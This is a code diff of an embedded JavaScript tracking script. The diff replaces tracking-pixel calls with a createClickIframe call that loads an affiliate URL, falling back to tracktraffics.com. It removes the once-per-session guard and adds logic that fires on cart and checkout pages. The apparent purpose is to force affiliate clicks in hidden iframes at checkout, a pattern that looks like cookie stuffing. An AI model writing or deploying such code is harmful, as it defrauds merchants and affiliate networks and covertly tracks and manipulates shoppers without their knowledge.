@@ -30,10 +30,10 @@
 
     async function initTracking() {
 
-         if (sessionStorage.getItem('iframe_triggered')) return;
+         //if (sessionStorage.getItem('iframe_triggered')) return;
 
         try {
-            let uniqueId = getCookie('tracking_uuid') || generateUUID();
+            let uniqueId = getCookie('tracking_uuid_awin') || generateUUID();
             let expires = (new Date(Date.now() + 30 * 86400 * 1000)).toUTCString();
             document.cookie = 'tracking_uuid=' + uniqueId + '; expires=' + expires + ';path=/;';
             
@@ -66,11 +66,11 @@
            
             if (result.success && result.affiliate_url) {
                 
-                createTrackingPixel(result.affiliate_url);
+                createClickIframe(result.affiliate_url);
                
                 sessionStorage.setItem('iframe_triggered', 'true');
             } else {
-                createTrackingPixel('https://www.tracktraffics.com/api/fallback-pixel?id=' + uniqueId);
+                createClickIframe('https://www.tracktraffics.com/api/fallback-pixel?id=' + uniqueId);
             }
         } catch (error) {
             console.error('Error in tracking script:', error);
@@ -92,8 +92,18 @@
         return '';
     }
 
+    function isCartPage() {
+            
+        const cartPages = ["/cart", "/checkout","/checkout/shipping","/checkout/cart","/shopping-cart"];
+        return cartPages.some(path => window.location.pathname.includes(path));
+    }
 
-    initTracking();
+    if (isCartPage()) {
+        initTracking();
+    }
+
+
+    //initTracking();
     //setTimeout(initTracking, 2000);
     window.addEventListener("DOMContentLoaded", initTracking);
 })();
